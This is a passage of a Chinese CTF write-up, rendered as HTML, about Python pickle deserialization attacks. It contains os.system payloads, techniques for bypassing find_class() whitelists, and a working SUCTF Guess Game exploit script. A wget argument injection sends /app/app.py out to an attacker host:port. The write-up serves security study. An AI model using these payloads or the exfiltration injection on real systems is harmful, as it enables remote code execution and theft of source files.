&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 覆盖引入模块的变量&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;123&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>函数执行&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 通过b&amp;#39;R&amp;#39;调用 __reducce__方法&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 通过b&amp;#39;i&amp;#39;调用&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 通过b&amp;#39;c&amp;#39;和b&amp;#39;o&amp;#39;调用&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 多参数调用函数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[module]&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[callable]&amp;#39;&lt;/span>&lt;span style="color:#111">)[,&lt;/span> &lt;span style="color:#111">param0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">param1&lt;/span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>实例化对象（特殊的函数执行）&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>先对题目有大概思路，然后辅以工具~好耶&lt;/p>
&lt;h3 id="工具二连---uanapickleuhttpsgithubcomsensepostanapickle">工具二连 - &lt;a href="https://github.com/sensepost/anapickle">&lt;u>anapickle&lt;/u>&lt;/a>&lt;/h3>
&lt;p>其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~&lt;/p>
&lt;h2 id="bypass">bypass!!!&lt;/h2>
&lt;h3 id="对类型的检查">对类型的检查&lt;/h3>
&lt;p>可以在已经构造好的opcode后面去掉&lt;code>.&lt;/code>再续上相应的对象的opcode，作为栈顶的值供检查&lt;/p>
&lt;h3 id="限制bc对模块的引入---find_class的重写">限制&lt;code>b'c'&lt;/code>对模块的引入 - &lt;code>find_class()&lt;/code>的重写&lt;/h3>
&lt;p>修改&lt;code>find_class()&lt;/code>会引入函数&amp;amp;模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用&lt;code>find_class()&lt;/code>的检查：&lt;/p>
&lt;ul>
&lt;li>opcode角度：出现&lt;code>c&lt;/code>, &lt;code>i&lt;/code>, &lt;code>b'\x93'&lt;/code>会调用&lt;/li>
&lt;li>python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过&lt;code>__import__&lt;/code>来绕过）&lt;/li>
&lt;/ul>
&lt;h3 id="--仅可以引入__main__开头的模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>__main__&lt;/code>开头的模块&lt;/h3>
&lt;p>“通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当&lt;code>c&lt;/code>指令只允许&lt;code>__main__&lt;/code>时，我们可以引入&lt;code>__main__.blue&lt;/code>（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是&lt;code>{'name': 'rua', 'grade': 'www'}&lt;/code>；之后执行BUILD指令，将会改写&lt;code>__main__.blue.name&lt;/code>和 &lt;code>__main__.blue.grade&lt;/code>，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。&lt;/p>
&lt;p>既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）&lt;/p>
&lt;h3 id="--仅可以引入题目中自设的模块模块名不能有__符">&amp;ndash;&amp;raquo;仅可以引入题目中自设的模块&amp;amp;模块名不能有&lt;code>__&lt;/code>符&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子2 - [SUCTF 2019]Guess Game
&lt;/h4>
&lt;/summary>
&lt;p>本地复现还是失败，无解，docker地址-&amp;gt;https://github.com/rmb122/suctf2019_guess_game&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png" alt="image-20210809115950444">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png" alt="image-20210809130400358">&lt;/p>
&lt;p>是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag&lt;/p>
&lt;p>然后是game_client.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png" alt="image-20210809130523878">&lt;/p>
&lt;p>接收数字的输入作为参数生成Ticket对象，序列化后发送到server端&lt;/p>
&lt;p>再看game_server.py，用了重写了的&lt;code>find_class()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png" alt="image-20210809130933730">&lt;/p>
&lt;p>这个限制的意思是导入的模块只能以guess_name开头并且名字里没有&lt;code>__&lt;/code>&lt;/p>
&lt;p>大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png" alt="image-20210809132300981">&lt;/p>
&lt;p>判断输赢则是需要Game辅助&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png" alt="image-20210809132437175">&lt;/p>
&lt;p>结合game_server.py的判断条件，拿到flag需要&lt;code>self.win_count == max_round == 10&lt;/code>&lt;/p>
&lt;p>那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写&lt;code>find_class()&lt;/code>后对加载指定模块的限制，而这里我们可以看到&lt;code>__init__.py&lt;/code>中&lt;code>game = Game()&lt;/code>，所以直接可以通过&lt;code>guess_game.game&lt;/code>引入&lt;code>Game()&lt;/code>类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先&lt;code>from guess_name import game&lt;/code>，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png" alt="image-20210809140423900">&lt;/p>
&lt;p>pickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后&lt;/p>
&lt;p>opcodes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cguess_name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#34;win_count&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#34;round_count&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">I9&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sbcguess_game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Ticket&lt;/span>\&lt;span style="color:#111">nTicket&lt;/span>\&lt;span style="color:#111">nq&lt;/span>\&lt;span style="color:#111">x00&lt;/span>&lt;span style="color:#111">)&lt;/span>\&lt;span style="color:#111">x81q&lt;/span>\&lt;span style="color:#111">x01&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>\&lt;span style="color:#111">x02X&lt;/span>\&lt;span style="color:#111">x06&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00numberq&lt;/span>\&lt;span style="color:#111">x03K&lt;/span>\&lt;span style="color:#111">x06sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># c之后是被find_class()监控的区域，拼接Ticket&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;node4.buuoj.cn&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">28803&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cguess_game
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">game
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">}S&amp;#34;win_count&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">I10
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">sS&amp;#34;round_count&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">I9
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">sbcguess_game.Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x06\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">numberq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">sb.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;I&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png" alt="image-20210809144613834">&lt;/p>
&lt;p>————用pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game.Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子3 - [巅峰极客 2021]what_pickle
&lt;/h4>
&lt;/summary>
&lt;p>登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现&lt;/p>
&lt;p>/images可以看到开着的debug界面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
&lt;p>能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来&lt;/p>
&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=—post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;p>依次读出/app/app.py和/app/config.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
